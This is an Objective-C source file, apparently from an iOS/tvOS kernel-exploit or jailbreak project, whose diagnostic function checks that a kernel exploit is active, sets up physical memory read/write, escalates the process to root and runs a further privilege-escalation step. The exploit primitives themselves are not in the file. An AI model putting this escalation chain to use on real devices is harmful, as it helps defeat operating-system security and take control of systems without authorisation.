#import "dt_build692_client.h"
#import "dt_kcall_planb.h"
#import "dt_physrw.h"
#import "DTRunLogger.h"
#import "kfd_tvos.h"
#import "dt_kernel_exploit.h"
#import "primitives.h"
#import "kernel.h"

#import <unistd.h>

typedef void (^dt692_log_fn)(NSString *line);

static void dt692_log(dt692_log_fn log, NSString *line)
{
    [[DTRunLogger shared] log:line];
    if (log)
        log(line);
}

static void dt692_emit(dt692_log_fn log, NSString *marker)
{
    dt692_log(log, marker);
    [[DTRunLogger shared] logStage:marker];
}

int dt_build692_run_diagnostic(void (^log)(NSString *line), NSString **verdictOut)
{
    dt692_emit(log, @"KCALL692_DIAG_BEGIN");

    if (!dt_kernel_exploit_is_active()) {
        if (verdictOut)
            *verdictOut = @"KCALL692_KFD_INACTIVE";
        return -1;
    }

    if (dt_build_physrw_handoff_only(log) != 0) {
        if (verdictOut)
            *verdictOut = @"KCALL692_PHYSRW_FAIL";
        return -2;
    }

    if (getuid() != 0) {
        uint64_t proc = proc_find(getpid());
        if (proc && dt_build_phys_root_esc(proc, log) == 0 && getuid() == 0) {
            dt692_log(log, @"[+] build692 root esc OK uid=0");
        }
        if (proc)
            proc_rele(proc);
    }

    if (getuid() != 0) {
        if (verdictOut)
            *verdictOut = @"KCALL692_ROOT_FAIL";
        return -3;
    }

    int priv_r = -1;
    uint64_t self_proc = proc_find(getpid());
    if (self_proc) {
        priv_r = dt_build97_privesc_preserve_slot0(self_proc, log);
        proc_rele(self_proc);
    }
    if (priv_r != 0) {
        if (verdictOut)
            *verdictOut = @"KCALL692_BUILD97_FAIL";
        return -4;
    }

    dt692_emit(log, @"KCALL692_NO_OPAINJECT");
    dt692_emit(log, @"KCALL692_NO_MUTATION");
    dt692_emit(log, @"KCALL692_NO_53D540");
    dt692_emit(log, @"KCALL692_NO_55106C");
    dt692_emit(log, @"KCALL692_NO_532A80");
    dt692_emit(log, @"KCALL692_NO_FILTER_MSG");
    dt692_emit(log, @"KCALL692_NO_5329AC");

    NSString *kernelVerdict = nil;
    int r = dt692_run_contradiction_diagnostic(log, &kernelVerdict);
    if (r != 0) {
        if (verdictOut)
            *verdictOut = kernelVerdict ?: @"KCALL692_DIAG_FAIL";
        return r;
    }

    if (verdictOut)
        *verdictOut = kernelVerdict ?: @"KCALL692_DIAG_PASS";
    return 0;
}
